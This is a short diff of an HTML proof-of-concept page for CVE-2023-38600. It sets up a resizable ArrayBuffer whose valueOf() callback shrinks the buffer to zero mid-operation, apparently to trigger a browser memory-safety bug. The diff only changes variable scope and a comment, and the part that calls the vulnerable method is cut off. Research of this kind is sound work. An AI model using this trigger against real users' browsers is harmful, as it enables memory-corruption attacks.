@@ -2,11 +2,13 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CVE-2023-38600 - PoC</title>
+  <title>CVE-2023-38600 Fixed PoC</title>
 </head>
 <body>
   <pre id="log"></pre>
   <script>
+    let ab; // declare in global scope
+
     function log(msg) {
       const el = document.getElementById("log");
       el.textContent += msg + "\n";
@@ -14,12 +16,12 @@
     }
 
     try {
-      const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
+      ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
       const u8 = new Uint8Array(ab);
       
       function call_back() {
         log("[+] Inside valueOf(): resizing buffer");
-        ab.resize(0); // unexpected resize during copyWithin!
+        ab.resize(0);
         return 0;
       }
 
